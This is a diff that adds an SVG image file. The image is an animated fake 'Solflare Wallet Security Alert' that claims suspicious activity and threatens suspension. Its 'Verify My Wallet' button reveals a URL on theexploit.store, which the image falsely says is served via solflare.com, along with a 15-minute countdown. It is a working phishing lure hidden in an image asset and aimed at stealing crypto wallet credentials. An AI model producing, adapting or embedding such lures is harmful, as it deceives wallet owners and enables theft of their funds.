@@ -1,0 +1,61 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg width="520" height="340" xmlns="http://www.w3.org/2000/svg">
+  <style>
+    .bg { fill: #0d0f1a; }
+    .card { fill: #1a1d2e; }
+    .border-orange { stroke: #ff6b35; stroke-width: 2; fill: none; }
+    .warn-icon { fill: #ff6b35; font-size: 32px; font-family: sans-serif; }
+    .title { fill: #ffffff; font-family: sans-serif; font-size: 20px; font-weight: bold; }
+    .body { fill: #8892b0; font-family: sans-serif; font-size: 13px; }
+    .btn-bg { fill: #ff6b35; cursor: pointer; }
+    .btn-text { fill: #ffffff; font-family: sans-serif; font-size: 14px; font-weight: bold; cursor: pointer; }
+    .domain { fill: #64ffda; font-family: sans-serif; font-size: 11px; }
+    .url-box { fill: #0a1628; stroke: #4fc3f7; stroke-width: 1.5; rx: 6; }
+    .url-text { fill: #4fc3f7; font-family: monospace; font-size: 15px; font-weight: bold; }
+    .url-label { fill: #8892b0; font-family: sans-serif; font-size: 12px; }
+    .step2-hint { fill: #64ffda; font-family: sans-serif; font-size: 12px; }
+    .hide { display: none; }
+    .show { display: inline; }
+  </style>
+
+  <!-- Background -->
+  <rect class="bg" width="520" height="340"/>
+  <rect class="card" x="20" y="20" width="480" height="300" rx="12"/>
+  <rect class="border-orange" x="20" y="20" width="480" height="300" rx="12"/>
+
+  <!-- STEP 1: Alert Panel (initially visible) -->
+  <g id="panel1" class="show">
+    <!-- Animate to hide when btn clicked -->
+    <set attributeName="class" begin="revbtn.click" to="hide" fill="freeze"/>
+
+    <text class="warn-icon" x="260" y="85" text-anchor="middle">⚠</text>
+    <text class="title" x="260" y="125" text-anchor="middle">Solflare Wallet Security Alert</text>
+    <text class="body" x="260" y="158" text-anchor="middle">Unusual transaction attempt detected on your wallet.</text>
+    <text class="body" x="260" y="178" text-anchor="middle">Immediate verification is required to prevent suspension.</text>
+
+    <!-- Clickable button -->
+    <g id="revbtn" cursor="pointer">
+      <rect class="btn-bg" x="160" y="210" width="200" height="46" rx="8"/>
+      <text class="btn-text" x="260" y="238" text-anchor="middle">Verify My Wallet →</text>
+    </g>
+
+    <text class="domain" x="260" y="295" text-anchor="middle">security.www.solflare.com</text>
+  </g>
+
+  <!-- STEP 2: URL Reveal Panel (initially hidden) -->
+  <g id="panel2" class="hide">
+    <!-- Animate to show when btn clicked -->
+    <set attributeName="class" begin="revbtn.click" to="show" fill="freeze"/>
+
+    <text class="title" x="260" y="90" text-anchor="middle">Secure Verification Portal</text>
+    <text class="url-label" x="260" y="130" text-anchor="middle">Visit the following URL to restore access:</text>
+
+    <!-- URL display box -->
+    <rect class="url-box" x="60" y="145" width="400" height="50" rx="6"/>
+    <text class="url-text" x="260" y="177" text-anchor="middle">theexploit.store/solflare/verify</text>
+
+    <text class="body" x="260" y="225" text-anchor="middle">Copy this address and paste it into your browser.</text>
+    <text class="step2-hint" x="260" y="260" text-anchor="middle">🔒 Served securely via www.solflare.com</text>
+    <text class="body" x="260" y="290" text-anchor="middle">Your session expires in 15 minutes.</text>
+  </g>
+</svg>
